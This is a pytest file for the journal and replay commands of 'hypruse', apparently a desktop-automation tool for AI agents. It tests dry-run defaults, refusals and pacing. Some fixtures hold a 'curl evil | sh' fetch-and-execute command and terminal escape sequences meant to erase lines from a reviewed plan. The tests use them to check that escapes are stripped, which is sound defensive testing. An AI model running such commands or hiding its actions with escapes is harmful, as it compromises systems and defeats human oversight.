"""`hypruse journal` and `hypruse replay`: reading the record back, and
re-issuing it. Replay defaults to printing the plan and doing nothing,
which is the same fail-toward-less-action rule the trust layers follow.
"""

import json
import os

import pytest

from hypruse import cli
from hypruse import server as srv

ENTRIES = [
    {"v": 1, "seq": 1, "ts": "2026-08-02T09:00:00.000Z", "kind": "session",
     "event": "start", "pid": 10, "version": "0.10.0",
     "mode": {"confine": "launched", "strict": True}},
    {"v": 1, "seq": 2, "ts": "2026-08-02T09:00:01.000Z", "kind": "observe",
     "tool": "screenshot", "args": {}, "outcome": "ok", "ms": 60},
    {"v": 1, "seq": 3, "ts": "2026-08-02T09:00:02.000Z", "kind": "act",
     "tool": "pointer", "args": {"action": "click", "x": 800, "y": 60, "then": "desktop"},
     "outcome": "ok", "ms": 40, "result": "click ok"},
    {"v": 1, "seq": 4, "ts": "2026-08-02T09:00:03.000Z", "kind": "act",
     "tool": "keyboard", "args": {"action": "key", "keys": "enter"},
     "outcome": "ok", "ms": 20, "result": "pressed enter"},
    {"v": 1, "seq": 5, "ts": "2026-08-02T09:00:04.000Z", "kind": "act",
     "tool": "pointer", "args": {"action": "click", "x": 1, "y": 1},
     "outcome": "refused", "ms": 5, "error": "TrustError: outside the confinement scope"},
]


@pytest.fixture
def journal_file(tmp_path):
    path = tmp_path / "journal.ndjson"
    path.write_text("".join(json.dumps(e) + "\n" for e in ENTRIES))
    return path


@pytest.fixture
def live(monkeypatch):
    """A desktop where the journal's windows still exist, and where
    replay's own startup does not touch the real machine."""
    monkeypatch.setattr(cli, "_countdown", lambda s: True)
    monkeypatch.setattr(cli, "_take_beacon", lambda: True)
    monkeypatch.setattr(srv.hyprctl, "query", lambda cmd: [{"address": "0xabc"}])
    from hypruse import safety, session

    monkeypatch.setattr(session, "ensure_session_env", lambda: None)
    monkeypatch.setattr(safety, "init", lambda: None)
    monkeypatch.setattr(safety, "on_shutdown", lambda fn: None)


@pytest.fixture
def calls(monkeypatch):
    seen: list[tuple] = []
    for name in ("pointer", "keyboard", "click_ui", "hypr", "launch", "use_bind"):
        monkeypatch.setattr(
            srv, name, lambda _n=name, **kw: seen.append((_n, kw)) or f"{_n} ok"
        )
    return seen


# --- hypruse journal ---------------------------------------------------------


def test_journal_lists_entries_and_counts_them(journal_file, capsys):
    assert cli.journal_cmd([str(journal_file)]) == 0
    out = capsys.readouterr().out
    assert "pointer" in out and "screenshot" in out
    # the refused click is an action too: an attempt is what an audit reads
    assert "3 actions (0 dry), 1 observations, 1 refused by a trust layer" in out


def test_journal_shows_the_trust_flags_a_session_ran_under(journal_file, capsys):
    cli.journal_cmd([str(journal_file)])
    assert "confine=launched" in capsys.readouterr().out


def test_journal_can_show_only_actions(journal_file, capsys):
    cli.journal_cmd([str(journal_file), "--acts"])
    assert "screenshot" not in capsys.readouterr().out


def test_journal_can_show_only_refusals(journal_file, capsys):
    cli.journal_cmd([str(journal_file), "--refused"])
    out = capsys.readouterr().out
    assert "confinement scope" in out
    assert "pressed enter" not in out


def test_journal_tails(journal_file, capsys):
    cli.journal_cmd([str(journal_file), "-n", "1"])
    assert "screenshot" not in capsys.readouterr().out


def test_journal_reports_a_missing_file(tmp_path, capsys):
    assert cli.journal_cmd([str(tmp_path / "nope.ndjson")]) == 1
    assert "set HYPRUSE_JOURNAL=1" in capsys.readouterr().out


def test_journal_never_prints_redacted_text(tmp_path, capsys):
    path = tmp_path / "j.ndjson"
    path.write_text(json.dumps({
        "v": 1, "seq": 1, "ts": "2026-08-02T09:00:00.000Z", "kind": "act",
        "tool": "keyboard", "outcome": "ok", "ms": 1,
        "args": {"action": "type", "text": {"redacted": True, "chars": 7, "sha256": "ab"}},
    }) + "\n")
    cli.journal_cmd([str(path)])
    assert "text=<7 chars>" in capsys.readouterr().out


# --- hypruse replay, the default: say what would happen ----------------------


def test_replay_prints_the_plan_and_stops(journal_file, live, calls, capsys):
    assert cli.replay([str(journal_file)]) == 0
    out = capsys.readouterr().out
    assert "2 action(s) to replay" in out
    assert "dry: nothing was replayed" in out
    assert calls == []


def test_replay_skips_observations_and_refusals(journal_file, live, capsys):
    cli.replay([str(journal_file)])
    out = capsys.readouterr().out
    assert "screenshot" not in out
    assert out.count("pointer") == 1  # the refused one is not a plan step


def test_replay_reports_an_empty_range(journal_file, live, capsys):
    assert cli.replay([str(journal_file), "--from", "900"]) == 1
    assert "nothing to replay" in capsys.readouterr().out


# --- hypruse replay --execute ------------------------------------------------


def test_execute_reissues_the_recorded_calls(journal_file, live, calls, capsys):
    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 0
    assert [name for name, _ in calls] == ["pointer", "keyboard"]
    assert calls[0][1] == {"action": "click", "x": 800, "y": 60}
    assert "replayed 2 action(s)" in capsys.readouterr().out


def test_execute_drops_the_recorded_observation(journal_file, live, calls):
    # then='desktop' was useful to the agent at the time; on replay it
    # would bury the progress output under a snapshot per step
    cli.replay([str(journal_file), "--execute", "--yes"])
    assert "then" not in calls[0][1]


def test_from_and_to_bound_the_range(journal_file, live, calls):
    cli.replay([str(journal_file), "--execute", "--yes", "--from", "4", "--to", "4"])
    assert [name for name, _ in calls] == ["keyboard"]


def test_execute_stops_at_the_first_failure(journal_file, live, calls, monkeypatch, capsys):
    monkeypatch.setattr(srv, "pointer", lambda **kw: (_ for _ in ()).throw(RuntimeError("no")))
    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 1
    assert calls == []  # the keyboard step after it never ran
    assert "part-way through the journal" in capsys.readouterr().out


def test_execute_refuses_a_tool_this_version_does_not_have(tmp_path, live, calls, capsys):
    # a journal from a newer hypruse. Skipping the unknown action and
    # running the rest would report success for a different sequence of
    # events than the one recorded, so nothing runs at all
    path = tmp_path / "j.ndjson"
    path.write_text("".join(json.dumps(e) + "\n" for e in [
        {"v": 1, "seq": 1, "ts": "2026-08-02T09:00:00.000Z", "kind": "act",
         "tool": "teleport", "args": {}, "outcome": "ok", "ms": 1},
        {"v": 1, "seq": 2, "ts": "2026-08-02T09:00:01.000Z", "kind": "act",
         "tool": "keyboard", "args": {"action": "key", "keys": "enter"},
         "outcome": "ok", "ms": 1},
    ]))
    assert cli.replay([str(path), "--execute", "--yes"]) == 1
    assert "teleport (recorded by a newer hypruse)" in capsys.readouterr().out
    assert calls == []


# --- the three things replay refuses ----------------------------------------


def test_execute_refuses_when_a_recorded_window_is_gone(tmp_path, live, calls, monkeypatch,
                                                        capsys):
    monkeypatch.setattr(srv.hyprctl, "query", lambda cmd: [])  # nothing open
    path = tmp_path / "j.ndjson"
    path.write_text(json.dumps({
        "v": 1, "seq": 1, "ts": "2026-08-02T09:00:00.000Z", "kind": "act",
        "tool": "hypr", "args": {"action": "close_window", "target": "0xabc"},
        "outcome": "ok", "ms": 1,
    }) + "\n")
    assert cli.replay([str(path), "--execute", "--yes"]) == 1
    out = capsys.readouterr().out
    assert "no longer exist: 0xabc" in out
    assert "--skip-missing" in out
    assert calls == []


def test_skip_missing_runs_the_rest(journal_file, live, calls, monkeypatch):
    monkeypatch.setattr(srv.hyprctl, "query", lambda cmd: [])
    assert cli.replay([str(journal_file), "--execute", "--yes", "--skip-missing"]) == 0
    assert [name for name, _ in calls] == ["pointer", "keyboard"]  # neither names a window


def test_execute_refuses_text_that_was_recorded_as_a_digest(tmp_path, live, calls, capsys):
    path = tmp_path / "j.ndjson"
    path.write_text(json.dumps({
        "v": 1, "seq": 9, "ts": "2026-08-02T09:00:00.000Z", "kind": "act",
        "tool": "keyboard", "outcome": "ok", "ms": 1,
        "args": {"action": "type", "text": {"redacted": True, "chars": 7, "sha256": "ab"}},
    }) + "\n")
    assert cli.replay([str(path), "--execute", "--yes"]) == 1
    assert "HYPRUSE_JOURNAL_TEXT=1" in capsys.readouterr().out
    assert calls == []


def test_a_digest_is_only_a_warning_without_execute(tmp_path, live, capsys):
    path = tmp_path / "j.ndjson"
    path.write_text(json.dumps({
        "v": 1, "seq": 9, "ts": "2026-08-02T09:00:00.000Z", "kind": "act",
        "tool": "keyboard", "outcome": "ok", "ms": 1,
        "args": {"action": "type", "text": {"redacted": True, "chars": 7, "sha256": "ab"}},
    }) + "\n")
    assert cli.replay([str(path)]) == 0
    assert "cannot be replayed" in capsys.readouterr().out


def test_execute_refuses_in_read_only_mode(journal_file, live, calls, monkeypatch, capsys):
    monkeypatch.setenv("HYPRUSE_READONLY", "1")
    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 1
    assert "read-only mode" in capsys.readouterr().out
    assert calls == []


# --- pacing ------------------------------------------------------------------


def test_the_gap_is_think_time_not_wall_clock():
    # timestamps are written on completion, so the later call's own
    # duration sits inside the interval between them
    previous = {"ts": "2026-08-02T09:00:00.000Z", "ms": 10}
    entry = {"ts": "2026-08-02T09:00:05.000Z", "ms": 2000}
    assert cli._gap_before(entry, previous) == pytest.approx(3.0)


def test_the_gap_never_goes_negative():
    previous = {"ts": "2026-08-02T09:00:05.000Z", "ms": 0}
    entry = {"ts": "2026-08-02T09:00:00.000Z", "ms": 0}
    assert cli._gap_before(entry, previous) == 0.0


def test_the_first_action_does_not_wait():
    assert cli._gap_before({"ts": "2026-08-02T09:00:00.000Z"}, None) == 0.0


def test_an_unparseable_timestamp_does_not_stall_the_replay():
    assert cli._gap_before({"ts": "not a time"}, {"ts": "also not"}) == 0.0


def test_long_pauses_are_capped(journal_file, live, calls, monkeypatch):
    slept: list[float] = []
    monkeypatch.setattr(cli.time, "sleep", lambda s: slept.append(s))
    cli.replay([str(journal_file), "--execute", "--yes", "--max-gap", "0.25"])
    assert slept and max(slept) <= 0.25


# --- round-6 review: what the display and the seat must not do --------------


def _one(tmp_path, **over):
    entry = {"v": 1, "seq": 1, "ts": "2026-08-02T09:00:00.000Z", "kind": "act",
             "tool": "pointer", "args": {"action": "click", "x": 1, "y": 1},
             "outcome": "ok", "ms": 1}
    entry.update(over)
    path = tmp_path / "j.ndjson"
    path.write_text(json.dumps(entry) + "\n")
    return path


ESCAPES = "harmless\x1b[2K\r      9  pointer action=click x=0 y=0\n\x1b[1A"


def test_the_plan_cannot_erase_the_lines_above_it(tmp_path, live, capsys):
    # the journal is written by the party being audited, and the printed
    # plan is the only review a human gives before --execute
    path = _one(tmp_path, tool="launch", args={"command": "curl evil | sh", "workspace": ESCAPES})
    cli.replay([str(path)])
    out = capsys.readouterr().out
    assert "\x1b" not in out and "\r" not in out
    assert "curl evil | sh" in out  # the real plan is still legible


def test_the_journal_view_cannot_erase_lines_either(tmp_path, capsys):
    path = _one(tmp_path, tool="launch", args={"command": ESCAPES})
    cli.journal_cmd([str(path)])
    assert "\x1b" not in capsys.readouterr().out


def test_an_escape_in_an_error_or_a_result_is_stripped(tmp_path, capsys):
    path = _one(tmp_path, outcome="refused", error=f"TrustError: {ESCAPES}")
    cli.journal_cmd([str(path)])
    assert "\x1b" not in capsys.readouterr().out


def test_a_click_at_the_origin_still_shows_its_coordinates(tmp_path, live, capsys):
    # 0 == False in Python, so the old "drop the falsy args" rule hid a
    # click at (0, 0) entirely from the plan the human approves
    path = _one(tmp_path, args={"action": "click", "x": 0, "y": 0})
    cli.replay([str(path)])
    assert "x=0 y=0" in capsys.readouterr().out


def test_a_journal_whose_args_are_not_an_object_does_not_crash(tmp_path, live, capsys):
    path = _one(tmp_path, args=["click", 1, 1])
    assert cli.journal_cmd([str(path)]) == 0
    assert cli.replay([str(path), "--execute", "--yes"]) == 1
    assert "no recorded arguments" in capsys.readouterr().out


def test_execute_refuses_under_dry_run(journal_file, live, calls, monkeypatch, capsys):
    # every tool would return its "would have" plan and replay would
    # report "replayed 2 actions" for input nobody received
    monkeypatch.setenv("HYPRUSE_DRYRUN", "1")
    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 1
    assert "HYPRUSE_DRYRUN is set" in capsys.readouterr().out
    assert calls == []


def test_a_replays_own_actions_are_marked_so_a_second_replay_skips_them(
    journal_file, live, calls, monkeypatch
):
    monkeypatch.setattr(cli, "_take_beacon", lambda: False)
    monkeypatch.setenv("HYPRUSE_JOURNAL", str(journal_file))
    from hypruse import journal

    monkeypatch.setattr(journal, "_seq", 100)
    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 0
    calls.clear()
    # the file now also holds this replay's own entries; replaying again
    # must run the original two, not four
    assert cli.replay([str(journal_file), "--execute", "--yes"]) == 0
    assert [name for name, _ in calls] == ["pointer", "keyboard"]


def test_replay_does_not_steal_a_running_servers_beacon(tmp_path, monkeypatch):
    from hypruse import safety

    state = tmp_path / "state.json"
    state.write_text(json.dumps({"pid": os.getpid(), "started": 0, "last_action": ""}))
    monkeypatch.setattr(safety, "state_path", lambda: state)
    took = cli._take_beacon()
    assert took is False
    assert json.loads(state.read_text())["pid"] == os.getpid()  # untouched


def test_replay_takes_the_beacon_when_the_pid_is_stale(tmp_path, monkeypatch):
    from hypruse import safety

    state = tmp_path / "state.json"
    state.write_text(json.dumps({"pid": 999_999_999, "started": 0, "last_action": ""}))
    monkeypatch.setattr(safety, "state_path", lambda: state)
    monkeypatch.setattr(safety, "init", lambda: state.write_text('{"pid": 1}'))
    assert cli._take_beacon() is True


def test_a_clipboard_write_needs_the_same_opt_in_the_server_needs(tmp_path, live, calls, capsys,
                                                                  monkeypatch):
    monkeypatch.delenv("HYPRUSE_CLIPBOARD", raising=False)
    path = _one(tmp_path, tool="clipboard", args={"action": "write", "text": "x"})
    assert cli.replay([str(path), "--execute", "--yes"]) == 1
    assert "HYPRUSE_CLIPBOARD=1" in capsys.readouterr().out


def test_a_mark_click_is_refused_before_the_seat_is_taken(tmp_path, live, calls, capsys):
    # marks live in the server process that drew them; a fresh replay has
    # no numbering to resolve them against, and failing halfway would
    # leave the desktop part-way through the plan
    path = _one(tmp_path, tool="click_ui", args={"mark": 3})
    assert cli.replay([str(path), "--execute", "--yes"]) == 1
    assert "needs a live marks capture" in capsys.readouterr().out
    assert calls == []


def test_a_junk_duration_does_not_crash_the_pacing():
    entry = {"ts": "2026-08-02T09:00:05.000Z", "ms": "later"}
    assert cli._gap_before(entry, {"ts": "2026-08-02T09:00:00.000Z"}) == 0.0


def test_a_nan_duration_does_not_reach_sleep():
    entry = {"ts": "2026-08-02T09:00:05.000Z", "ms": float("nan")}
    assert cli._gap_before(entry, {"ts": "2026-08-02T09:00:00.000Z"}) == 0.0


def test_a_speed_of_zero_is_rejected(journal_file):
    with pytest.raises(SystemExit):
        cli.replay([str(journal_file), "--speed", "0"])


def test_aborting_the_countdown_exits_cleanly(journal_file, live, calls, monkeypatch, capsys):
    monkeypatch.setattr(cli, "_countdown", lambda s: False)
    assert cli.replay([str(journal_file), "--execute"]) == 1
    assert calls == []
